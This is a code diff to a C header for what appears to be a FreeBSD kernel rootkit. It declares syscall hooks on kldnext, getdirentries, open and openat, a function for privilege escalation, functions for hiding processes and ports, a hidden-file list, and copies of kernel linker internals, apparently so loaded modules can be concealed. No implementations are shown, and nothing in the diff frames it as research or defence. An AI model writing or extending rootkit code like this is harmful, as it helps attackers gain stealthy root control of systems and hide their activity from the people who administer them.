@@ -36,6 +36,26 @@
 #define R_FLAG_EXEC		0b00000100
 #define R_FLAG_VIEW		0b00001000
 
+typedef TAILQ_HEAD(, module) modulelist_t;
+
+extern struct sx kld_sx;
+extern int next_file_id;
+extern int nextid;
+extern linker_file_list_t linker_files;
+extern modulelist_t modules;
+
+struct module {
+	TAILQ_ENTRY(module) link;    /* chain together all modules */
+	TAILQ_ENTRY(module) flink;   /* all modules in a file */
+	struct linker_file *file;   /* file which contains this module */
+	int refs;    /* reference count */
+	int id;      /* unique id number */
+	char *name;   /* module name */
+	modeventhand_t handler; /* event handler */
+	void *arg;    /* argument for handler */
+	modspecific_t data;    /* module specific data */
+};
+
 struct node {
 	char filename[256];
 	struct node * next;
@@ -46,12 +66,11 @@ int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
 int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
 int hook_sys_open(struct thread *, struct open_args *);
 int hook_sys_openat(struct thread * td, struct openat_args * uap);
-int hook_sys_execve(struct thread *td, struct execve_args *uap);
-int hook_sys_read(struct thread *, struct read_args *);
-int hook_sys_write(struct thread *, struct write_args *);
 
 
 void elevate(struct thread *td);
+int process_hiding(char * p_name);
+int port_hiding(u_int16_t lport);
 
 int add_file(char * uaddr);
 int remove_file(char * uaddr);
